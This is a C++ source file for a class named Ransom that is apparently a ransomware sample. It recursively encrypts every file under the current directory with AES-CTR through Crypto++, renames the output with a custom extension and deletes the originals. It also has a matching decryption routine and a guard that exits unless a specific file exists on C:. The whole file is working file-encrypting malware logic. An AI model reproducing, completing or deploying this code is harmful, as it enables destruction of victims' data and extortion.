#include "Ransom.h"
#include "../cryptopp/files.h"

inline bool EndOfFile(const CryptoPP::FileSource& file)
{
	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
	return stream->eof();
}

void Ransom::run_encryption_logic(const char* exe_file_name)
{
	// 1- Get an encryption key
	// 2- Get all files
	// 3- Encrypt files
	const auto file_name = std::filesystem::path(exe_file_name).filename();

	safe_to_run();

	this->generate_aes_key();
	const auto path = std::filesystem::current_path();

	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
	{
		if (entry.path().filename() == file_name || entry.path().filename().extension() == custom_extension_name)
		{
			// Do not encrypt the key file, the executable itself, or an already encrypted file
			continue;
		}

		if (entry.is_regular_file())
		{
			auto entry_name = absolute(entry).generic_string();
			
#ifdef DEBUG
			std::cout << "Encrypting file " << entry_name << std::endl;
#endif

			encrypt_files(const_cast<char*>(entry_name.c_str()));
			delete_file(const_cast<char*>(entry_name.c_str()));
		}
	}
}

void Ransom::run_decryption_logic(const char* exe_file_name)
{
	// if isEncrypted, find all files with the proper custom extension
	const auto path = std::filesystem::current_path();
	const auto file_name = std::filesystem::path(exe_file_name).filename();

	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
	{
		if (entry.path().filename() == file_name)
		{
			// Do not encrypt the key file, the executable itself, or an already encrypted file
			continue;			
		}
		
		if (entry.is_regular_file() && entry.path().filename().extension() == custom_extension_name)
		{
			auto entry_name = absolute(entry).generic_string();

#ifdef DEBUG
			std::cout << "Decrypting file " << entry_name << std::endl;
#endif
			
			decrypt_files(const_cast<char*>(entry_name.c_str()));
			delete_file(const_cast<char*>(entry_name.c_str()));
		}
	}
}

void Ransom::encrypt_files(const char* file_name)
{
	auto size = std::filesystem::file_size(file_name);
	std::string file_name_string = file_name;
	const auto out = const_cast<char*>(file_name_string.append(custom_extension_name).c_str());

	try
	{
		CryptoPP::CTR_Mode<CryptoPP::AES>::Encryption encryptor;
		encryptor.SetKeyWithIV(key_->BytePtr(), key_->size(), iv_->BytePtr());
		
		
		CryptoPP::MeterFilter meter;
		CryptoPP::StreamTransformationFilter filter(encryptor);

		CryptoPP::FileSource source(file_name, false);
		CryptoPP::FileSink sink(out);

		source.Attach(new CryptoPP::Redirector(filter));
		filter.Attach(new CryptoPP::Redirector(meter));
		meter.Attach(new CryptoPP::Redirector(sink));

		const CryptoPP::word64 BLOCK_SIZE = 4096;
		CryptoPP::word64 processed = 0;

		while (!EndOfFile(source) && !source.SourceExhausted())
		{
			source.Pump(BLOCK_SIZE);
			filter.Flush(false);

			processed += BLOCK_SIZE;

			if (processed % (1024 * 1024 * 10) == 0) {
				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
			}
		}

		// Signal there is no more data to process.
		// The dtor's will do this automatically.
		filter.MessageEnd();
	}
	catch (const CryptoPP::Exception & ex)
	{
		std::cerr << ex.what() << std::endl;
	}
}

void Ransom::decrypt_files(const char* file_name)
{
	std::string file_name_string = file_name;
	const auto last_index = file_name_string.find_last_of(".");
	
	if (last_index == std::string::npos) {
		return;
	}
	
	file_name_string = file_name_string.substr(0, last_index);
	const auto full_name = const_cast<char*>(file_name_string.c_str());

	try
	{
		CryptoPP::CTR_Mode<CryptoPP::AES>::Decryption decryptor;
		decryptor.SetKeyWithIV(key_->BytePtr(), key_->size(), iv_->BytePtr());

		CryptoPP::MeterFilter meter;
		CryptoPP::StreamTransformationFilter filter(decryptor);

		CryptoPP::FileSource source(file_name, false);
		CryptoPP::FileSink sink(full_name);

		source.Attach(new CryptoPP::Redirector(filter));
		filter.Attach(new CryptoPP::Redirector(meter));
		meter.Attach(new CryptoPP::Redirector(sink));

		const CryptoPP::word64 BLOCK_SIZE = 4096;
		CryptoPP::word64 processed = 0;

		while (!EndOfFile(source) && !source.SourceExhausted())
		{
			source.Pump(BLOCK_SIZE);
			filter.Flush(false);

			processed += BLOCK_SIZE;

			if (processed % (1024 * 1024 * 10) == 0) {
				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
			}		
				
		}

		// Signal there is no more data to process.
		// The dtor's will do this automatically.
		filter.MessageEnd();
	}
	catch (const CryptoPP::Exception & ex)
	{
		std::cerr << ex.what() << std::endl;
	}
	
	//const auto decrypted_file_dest = new CryptoPP::FileSink(full_name);
	//CryptoPP::FileSource(file_name, true, new CryptoPP::PK_DecryptorFilter(rng_, d, decrypted_file_dest));
}

void Ransom::generate_aes_key()
{
	// Generate a random key
	key_= new CryptoPP::SecByteBlock(0x00, CryptoPP::AES::DEFAULT_KEYLENGTH);
	rng_.GenerateBlock(key_->BytePtr(), key_->size());

	// Generate a random IV
	iv_ = new CryptoPP::SecByteBlock(CryptoPP::AES::BLOCKSIZE);
	rng_.GenerateBlock(iv_->BytePtr(), iv_->size());
}

void Ransom::delete_file(const char* file)
{
	if (remove(file) != 0)
	{
#ifdef DEBUG
		std::cout << "Error deleting file" << std::endl;
#endif
	} else
	{
#ifdef DEBUG
		std::cout << "File successfully deleted" << std::endl;
#endif
	}
}

void safe_to_run()
{
	// That is quite a polite Ransomware
	if(!std::filesystem::exists("C:\\comptabilite.txt")) {
		exit(1);
	}
}